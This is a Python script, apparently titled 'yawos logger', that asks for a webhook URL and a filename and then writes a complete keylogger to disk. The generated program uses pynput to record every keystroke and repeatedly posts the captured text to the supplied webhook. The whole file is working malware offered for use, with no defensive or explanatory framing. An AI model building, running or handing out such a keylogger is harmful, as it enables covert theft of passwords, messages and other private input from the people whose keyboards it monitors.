from colorama import Fore
import time
import os

def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


banner = '''                             _                                 
 _   _  __ ___      _____  ___  | | ___   __ _  __ _  __ _  ___ _ __ 
| | | |/ _` \ \ /\ / / _ \/ __| | |/ _ \ / _` |/ _` |/ _` |/ _ \ '__|
| |_| | (_| |\ V  V / (_) \__ \ | | (_) | (_| | (_| | (_| |  __/ |   
 \__, |\__,_| \_/\_/ \___/|___/ |_|\___/ \__, |\__, |\__, |\___|_|   
 |___/                                   |___/ |___/ |___/           
 
'''

print(f"{Fore.GREEN}{banner}{Fore.RESET}")
time.sleep(2)
clear()

url = input(f"{Fore.BLUE}Enter your webhook: {Fore.RESET}")
filename = input(f"{Fore.BLUE}Enter your filename: {Fore.RESET}")
filename += ".py"


code = f'''
import requests
from pynput import keyboard
import threading
import time


pressed_keys = []
webhook_url = "{url}"


def on_press(key):
    try:
        pressed_keys.append(key.char)
    except AttributeError:
        pressed_keys.append(str(key))


def send_webhook_data():
    while True:
        if pressed_keys:
            data = {{
                "username": "omer",
                "content": "".join(pressed_keys)
            }}
            response = requests.post(webhook_url, json=data)
            pressed_keys.clear()
        time.sleep(1.9)


def start_key_listener():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    key_listener_thread = threading.Thread(target=start_key_listener)
    webhook_thread = threading.Thread(target=send_webhook_data)


    key_listener_thread.start()
    webhook_thread.start()


    key_listener_thread.join()
    webhook_thread.join()

'''



with open(filename, "w") as file:
    file.write(code)


print(f"{Fore.BLUE}{filename} adında bir Python dosyası oluşturuldu.{Fore.RESET}")
